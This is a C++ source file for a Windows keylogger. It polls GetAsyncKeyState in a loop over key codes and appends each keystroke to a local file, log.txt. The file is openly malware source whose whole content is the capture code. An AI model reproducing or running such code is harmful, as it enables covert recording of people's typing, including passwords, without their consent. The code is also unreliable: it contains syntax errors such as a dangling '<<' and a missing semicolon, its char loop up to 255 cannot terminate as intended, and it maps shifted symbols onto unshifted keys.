#include<fstream>
#include<Windows.h>
#include<iostream>

using namespace std;

int save(int key);

int main()
{
    char input;
    while (true)
    {for(input=8;input<=255;input++)
    {if(GetAsyncKeyState(input)==-32767)
      save(input);
    }
    }
    return 0;
}

int save(int key)
{  
    ofstream fout;
    fout.open("log.txt",ios::out|ios::app);
    switch(key)
    { case 8:fout<<"[backspace]"; break;
      
      case 9:fout<<"[horizontal tab]"; break;
      
      case 32:fout<<"[space]"<< ; break;
      
      case 33:fout<<"!" break;
      
      case 50: fout << "@"; break;
				// It can vary by keyboard.
		  case 51: fout << "#"; break;
				// It can vary by keyboard.
			case 52: fout << "$"; break;
				// It can vary by keyboard.
			case 53: fout << "%"; break;
				// It can vary by keyboard.
			case 54: fout << "^"; break;
				// It can vary by keyboard.
			case 55: fout << "&"; break;
				// It can vary by keyboard.
			case 56: fout << "*"; break;
				// It can vary by keyboard.
			case 57: fout << "("; break;
				// It can vary by keyboard.
			case 186: fout << ":"; break;
				// It can vary by keyboard.
			case 187: fout << "+"; break;
				// It can vary by keyboard.
			case 188: fout << "<"; break;
				// It can vary by keyboard.
			case 189: fout << "_"; break;
			
			case 190: fout << ">"; break;
			
			case 191: fout << "\?"; break;
				// It can vary by keyboard.
			case 192: fout << "~"; break;
				// It can vary by keyboard.
			case 219: fout << "{"; break;
				// It can vary by keyboard.
			case 220: fout << "|"; break;
				// It can vary by keyboard.
			case 221: fout << "}"; break;
				// It can vary by keyboard.
			case 222: fout << "\""; break;                 
    
       default :cout<<(char)key<<endl;
                fout<<(char)key;
                break;
    }            
    fout.close();
    return 0;
    
}